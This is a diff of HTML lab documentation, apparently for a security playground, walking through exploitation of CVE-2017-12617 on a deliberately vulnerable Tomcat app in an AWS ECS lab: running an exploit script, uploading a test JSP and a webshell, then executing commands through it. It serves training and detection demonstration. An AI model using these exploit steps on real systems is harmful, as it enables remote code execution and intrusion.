@@ -840,9 +840,12 @@
 <li>Running app: Java-Goof running on vulnerable Tomcat</li>
 <li>Extracted contents of <code>exploit.zip</code></li>
 </ul>
+<p>Ensure to have an ECS Cluster up and running:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$<span class="w"> </span>pgo<span class="w"> </span>--apply<span class="w"> </span>ecs
+</code></pre></div>
 <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span><span class="si">${</span><span class="nv">ONEPATH</span><span class="si">}</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>$<span class="w"> </span>unzip<span class="w"> </span>exploits.zip
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span><span class="si">${</span><span class="nv">ONEPATH</span><span class="si">}</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>$<span class="w"> </span>unzip<span class="w"> </span>exploits.zip
 </code></pre></div>
 <h2 id="disclaimer">Disclaimer<a class="headerlink" href="#disclaimer" title="Permanent link">&para;</a></h2>
 <blockquote>
@@ -850,56 +853,56 @@
 </blockquote>
 <h2 id="exploiting">Exploiting<a class="headerlink" href="#exploiting" title="Permanent link">&para;</a></h2>
 <p>First, retrieve the load balancer DNS name</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$<span class="w"> </span>pgo<span class="w"> </span>-o<span class="w"> </span>ecs
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$<span class="w"> </span>pgo<span class="w"> </span>-o<span class="w"> </span>ecs
 </code></pre></div>
 <p>Example output with ECS EC2:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">cluster_name_ec2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;playground-ecs-ec2&quot;</span>
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nv">loadbalancer_dns_ec2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nv">cluster_name_ec2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;playground-ecs-ec2&quot;</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nv">loadbalancer_dns_ec2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com&quot;</span>
 </code></pre></div>
 <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>
 <h3 id="checking-if-app-server-is-vulnerable">Checking if app server is vulnerable<a class="headerlink" href="#checking-if-app-server-is-vulnerable" title="Permanent link">&para;</a></h3>
 <p>Now you can check to see if the tomcat server is vulnerable.
 If it is you should see something similar to the following:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span><span class="si">${</span><span class="nv">ONEPATH</span><span class="si">}</span>/exploits/tomcat-rce/
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>$<span class="w"> </span>python3<span class="w"> </span>exploit.py<span class="w"> </span>-u<span class="w"> </span>http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span><span class="si">${</span><span class="nv">ONEPATH</span><span class="si">}</span>/exploits/tomcat-rce/
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>$<span class="w"> </span>python3<span class="w"> </span>exploit.py<span class="w"> </span>-u<span class="w"> </span>http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a> | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a> | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \| |  / /  
-<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a> | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
-<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
-<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
-<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
-<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
-<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>[@intx0x80]
-<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>
-<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
-<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>Poc Filename  Poc.jsp
-<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com it&#39;s Vulnerable to CVE-2017-12617
-<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a> | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a> | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \| |  / /  
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a> | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>[@intx0x80]
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>Poc Filename  Poc.jsp
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com it&#39;s Vulnerable to CVE-2017-12617
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp
 </code></pre></div>
 <p>If you point a browser at <a href="http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp">http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp</a> you should get a test page with a bunch of "A" char's - that shows the exploit worked.</p>
 <p>Vision One Observed Attack Techniques:</p>
 <p><img alt="alt text" src="../images/xdr_for_containers-ecs-tomcat-rce-01.png" title="Poc" /></p>
 <h3 id="inject-the-exploit-and-run-commands-in-the-container-from-browser">Inject the exploit and run commands in the container from browser<a class="headerlink" href="#inject-the-exploit-and-run-commands-in-the-container-from-browser" title="Permanent link">&para;</a></h3>
 <p>Next, inject the exploit and just hit <code>ENTER</code> at the shell prompt that comes up. (Ignore the error afterward)</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>$<span class="w"> </span>python3<span class="w"> </span>exploit.py<span class="w"> </span>-u<span class="w"> </span>http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com<span class="w"> </span>-p<span class="w"> </span>pwn
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>$<span class="w"> </span>python3<span class="w"> </span>exploit.py<span class="w"> </span>-u<span class="w"> </span>http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com<span class="w"> </span>-p<span class="w"> </span>pwn
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a> | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
-<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a> | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \| |  / /  
-<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a> | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
-<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
-<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
-<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
-<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
-<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>[@intx0x80]
-<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
-<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
-<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>Uploading Webshell .....
-<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>$ 
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a> | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a> | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / &#39;_ \| |  / /  
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a> | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>[@intx0x80]
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>Uploading Webshell .....
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>$ 
 </code></pre></div>
 <p>Either in the shell or from within your browser <a href="http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/pwn.jsp">http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/pwn.jsp</a> test some commands like <code>whoami</code> or <code>dpkg -l</code>.</p>
 <p>Your browser should present you a blank page with a form containing single field and a <code>Run</code> button. Type any Linux command you want and submit the form. The results will populate the page.</p>
